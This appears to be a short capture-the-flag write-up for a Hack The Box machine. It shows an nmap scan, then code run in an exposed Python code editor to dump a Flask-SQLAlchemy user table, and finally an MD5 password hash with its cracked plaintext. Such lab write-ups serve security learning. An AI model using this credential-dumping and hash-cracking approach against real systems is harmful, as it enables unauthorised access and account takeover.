
```
[Mar 24, 2025 - 23:14:08 (+03)] exegol-htb /workspace # nmap -sC -sV 10.129.36.145
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-24 23:14 +03
Nmap scan report for 10.129.36.145
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b5b97cc4503295bcc26517df51a27abd (RSA)
|   256 94b525549b68afbe40e11da86b850d01 (ECDSA)
|_  256 128cdc97ad8600b488e229cf69b56596 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```


```
# Show all variables and functions available in the current global scope
print(globals())

```

here we see that there is a SQLAlchemy looking it up we find the following documentation

https://flask-sqlalchemy.readthedocs.io/en/stable/config/


```
# Query all users from the User table
users = User.query.all()

# Loop through each user and print their details
for user in users:
    print(f"User ID: {user.id}")
    print(f"Username: {user.username}")
    print(f"Password: {user.password}")  # Don't print passwords in production for security reasons
    print('-' * 30)

# Example: Query a specific user by username
user = User.query.filter(User.username == 'admin').first()
if user:
    print(f"Admin User ID: {user.id}")
    print(f"Admin Username: {user.username}")
    print(f"Admin Password: {user.password}")  # Again, avoid printing passwords in real applications
else:
    print("Admin user not found.")

```


```
User ID: 1 Username: development Password: 759b74ce43947f5f4c91aeddc3e5bad3 
------------------------------ User ID: 2 Username: martin Password: 3de6f30c4a09c27fc71932bfc68474be 
------------------------------ Admin user not found. 
```




| hash                             | type | result             |
| :------------------------------- | :--- | :----------------- |
| 3de6f30c4a09c27fc71932bfc68474be | md5  | nafeelswordsmaster |

Hash	Type	Result
3de6f30c4a09c27fc71932bfc68474be	md5	nafeelswordsmaster


